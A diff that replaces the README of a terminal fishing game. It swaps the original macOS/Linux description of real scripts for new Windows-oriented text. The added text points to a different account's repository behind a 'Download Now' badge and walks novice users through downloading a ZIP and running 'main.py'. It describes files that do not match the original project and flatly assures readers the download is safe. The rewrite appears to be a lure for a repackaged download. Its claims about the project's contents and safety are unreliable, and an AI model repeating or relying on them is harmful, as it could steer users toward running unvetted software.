@@ -1,199 +1,72 @@
+# 🎣 terminal-fish - Catch fish inside your own terminal
 
-![Terminal Fish Demo](assets/demo.gif)
+[![](https://img.shields.io/badge/Download_Now-Blue?style=for-the-badge)](https://github.com/tactical-basidiomycetes9418/terminal-fish)
 
-# 🐠 Terminal Fish
+terminal-fish brings the excitement of fishing to your computer screen using simple text characters. You do not need experience with code or computers to play this game. This project focuses on relaxation and collection. You catch digital fish, move them into an aquarium, and keep track of your findings in a digital book called the FishDex. The entire experience happens inside a standard terminal window on your Windows computer.
 
-A terminal-based fishing game suite written in Python and Bash. Catch fish, build your collection, watch them swim in a live aquarium, and browse your FishDex like a Pokédex — all inside your terminal.
+## 🛠 Prerequisites
 
----
+You need a few things on your computer before you start playing. Ensure you have the following installed:
 
-## 📦 What's Included
+1. A Windows 10 or Windows 11 operating system.
+2. Python. You can download the latest version from the official Python website if you do not have it. During installation, make sure to check the box that says "Add Python to PATH."
+3. A terminal application. Windows Terminal comes installed on most modern computers. You can also use Command Prompt or PowerShell.
 
-| File | Description |
-|------|-------------|
-| `fish_catcher.sh.en` | The main fishing script — cast your line and catch fish |
-| `fish_book.py.en` | FishDex — browse your caught fish collection with animations |
-| `fish_tank.py.en` | Live aquarium — watch your caught fish swim around |
-| `fish_tank_colors.py.en` | Live aquarium — watch your caught fish swim around + colors for the terminal with faded corals |
-| `set_language.py` | Language switcher (EN / RU / ZH / JA) |
-| `install.sh` | Installer — sets everything up in one command |
-| `kitty_fish_record.dat` | full file for aquarium (without fishing) |
+## 📥 Getting Started
 
----
+Follow these steps to set up the game on your system.
 
-## 🚀 Quick Start
+1. Visit the [official repository page](https://github.com/tactical-basidiomycetes9418/terminal-fish) to download the game.
+2. Look for the green "Code" button near the top right of the page.
+3. Click "Download ZIP" to save the game files to your computer.
+4. Locate the downloaded file in your "Downloads" folder.
+5. Right-click the file and select "Extract All." Choose a folder where you want to keep the game and click "Extract."
+6. Open the folder you just created.
 
-### Requirements
+## 🕹 How to Play
 
-- **macOS** or **Linux**
-- Python 3.8+
-- Bash 4+
-- A terminal with UTF-8 and 256-color support (iTerm2, Kitty, Alacritty, GNOME Terminal, etc.)
+Once you have the files on your computer, you are ready to start your fishing journey.
 
-### Install
+1. Open your terminal by clicking the Start button and typing "Terminal" or "PowerShell."
+2. Type `cd` followed by a space, then drag the folder containing the game into the terminal window. Press Enter.
+3. Type `python main.py` and press Enter to launch the game.
+4. Use your keyboard arrow keys to navigate the menus.
+5. Press the Spacebar to cast your line into the water.
+6. Wait for a bite. When the text changes, press Enter to reel in your catch.
 
-```bash
-# Clone the repo
-git clone https://github.com/red-cockroach137/terminal-fish.git && cd terminal-fish
+## 🐠 Features
 
-# Run the installer
-bash install.sh
-```
+*   **Diverse Catching Mechanics:** Different fish require different timing techniques. Master your reel to catch rare varieties.
+*   **Virtual Aquarium:** Move the fish you catch into a live aquarium view. Watch them swim across your terminal screen while you work or relax.
+*   **FishDex Catalog:** A built-in database tracks every fish you catch. View detailed descriptions and statistics for every entry in your collection.
+*   **ASCII Art Graphics:** The game uses text-based art to render the environment and the fish. This design choice ensures the game runs smoothly on any system without heavy graphics requirements.
+*   **Customizable Settings:** Change the color themes of your terminal or the game interface to suit your preferences.
 
-The installer will:
-1. Check all required files and dependencies
-2. Copy scripts to `~/bin/`
-3. Make everything executable
-4. Enters aliases into .zshrc or .bashrc
+## ⚙️ Troubleshooting
 
-> 🌍 Language / Язык / 语言 / 言語: Run `python3 set_language.py` to switch between **English**, **Russian**, **Chinese**, and **Japanese**.
+If the game does not start, check these common issues:
 
-### Run
+*   **Python Path:** If your computer says "python is not recognized," you need to reinstall Python and select the "Add to PATH" option during setup.
+*   **Terminal Size:** Make sure your terminal window is large enough to display the ASCII art. If the screen looks scrambled, drag the corners of the window to make it wider.
+*   **Permissions:** You may need to run your terminal as an administrator if you saved the game in a restricted system folder.
 
-```bash
-# Go fishing
-open a new tab 
+## 📂 File Structure
 
-or 
+*   `main.py`: This is the primary file that starts the game engine.
+*   `assets`: This folder contains the text-based art files for the fish and environments.
+*   `data`: This folder stores your save files, including your FishDex and aquarium state.
+*   `requirements.txt`: This file tells your computer which additional tools are needed to play the game correctly.
 
-fish_catcher.sh
+## 📋 Common Questions
 
-# Browse your FishDex
-fish_book
+**Do I need an internet connection?**
+No. Once you download the files, the game runs entirely on your local computer.
 
-# Open the live aquarium
-fish_tank
+**Can I move my game to a different computer?**
+Yes. Copy the folder containing the game to a USB drive or cloud storage. You can move the files to any computer that has Python installed.
 
-# Open the live aquarium + colors
-fish_tank_color
-```
+**Is it safe?**
+Yes. This is an open-source project. You can inspect all files manually to see exactly how the game functions.
 
-### If you only need an aquarium with all the fish already in stock:
-```
-cp kitty_fish_record.dat ~/.kitty_fish_record.dat
-```
----
-
-## 🎮 How It Works
-
-### 🎣 Fishing (`fish_catcher.sh`)
-
-Run the script and it randomly generates a catch based on rarity odds:
-
-| Rarity | Chance | Color |
-|--------|--------|-------|
-| Common | 65% | White |
-| Uncommon | 25% | Green |
-| Rare | 8% | Blue |
-| Epic | 2% | Purple |
-| Legendary | 0.01% | Gold |
-
-Each species has its own size range — bigger fish of the same species are rarer. Your personal record per species is saved automatically.
-
-### 📖 FishDex (`fish_book.py`)
-
-Browse your caught fish like a Pokédex:
-
-| Key | Action |
-|-----|--------|
-| `←` `→` | Switch pages |
-| `↑` `↓` | Move between cards |
-| `Enter` | Open fish details (animated popup) |
-| `Esc` / `B` | Close popup |
-| `Q` | Quit |
-
-Each card shows rarity, personal best size, and a rating from **F** to **SSS** based on how close your catch is to the species maximum.
-
-### 🐠 Aquarium (`fish_tank.py`)
-
-A live screensaver — your caught fish swim across the screen with coral decorations:
-
-| Key | Action |
-|-----|--------|
-| `D` | Toggle / shuffle decorations |
-| `R` | Refresh the tank |
-| `Q` | Quit |
-
-### 🌍 Language Switcher (`set_language.py`)
-
-Switches all UI text across all scripts at once:
-
-| # | Language |
-|---|----------|
-| 1 | 🇬🇧 English |
-| 2 | 🇷🇺 Russian (Русский) |
-| 3 | 🇨🇳 Chinese (中文) |
-| 4 | 🇯🇵 Japanese (日本語) |
-
----
-
-## 🐟 Fish Roster
-
-### ⚪ Common
-`fish` · `who` · `comrade` · `lil_bro` · `baby_shark` · `smoking_fish`
-
-### 🟢 Uncommon
-`cooperatish` · `piranha` · `smiling_fish` · `flat_earthism` · `bigboy` · `sea_horse`
-
-### 🔵 Rare
-`horse_of_sea` · `UFO?` · `f_117` · `dummy`
-
-### 🟣 Epic
-`shark_sniffer` · `skull` · `dolphy` · `crush`
-
-### 🟡 Legendary
-`shank_fish` · `closed_claw` · `Bubbie` · `mrs_puff`
-
----
-
-## 💾 Data Storage
-
-All catches are saved to `~/.kitty_fish_record.dat` — a plain text file, one record per species:
-
-```
-fish|8|2024-03-12 14:22
-baby_shark|28|2024-04-01 09:11
-mrs_puff|420|2024-06-01 23:59
-```
-
-Format: `species_name | length_cm | date`
-
-To reset your progress:
-```bash
-rm ~/.kitty_fish_record.dat
-```
-
-To delete all:
-```bash
-bash delete_sad_fish.sh
-```
-
----
-
-## 💛 Support the Project
-
-If you enjoy Terminal Fish and want to say thanks — crypto donations are welcome:
-
-TON:
-```
-UQBHycodO_bwdPW96UB1wuEPqHcpao-kbQBEkjnrZ3KzRkaW
-```
-
-Terminal Fish is free and always will be. ✌️
-
----
-
-## 📄 License
-
-**Terminal Fish Non-Commercial License (TFNL-1.0)**
-Free to use, modify, and share for personal non-commercial purposes.
-**Selling or commercial use is prohibited.**
-See [LICENSE](./LICENSE) for full terms.
-
----
-
-## 🙏 Credits
-
-Built with love, `curses`, Bash, and a lot of ASCII art.
-
-> *"The sea, once it casts its spell, holds one in its net of wonder forever."*
+**How do I save my progress?**
+The game automatically saves your progress whenever you catch a fish or move a fish to your aquarium. Your data remains in the `data` folder regardless of when you close the terminal.
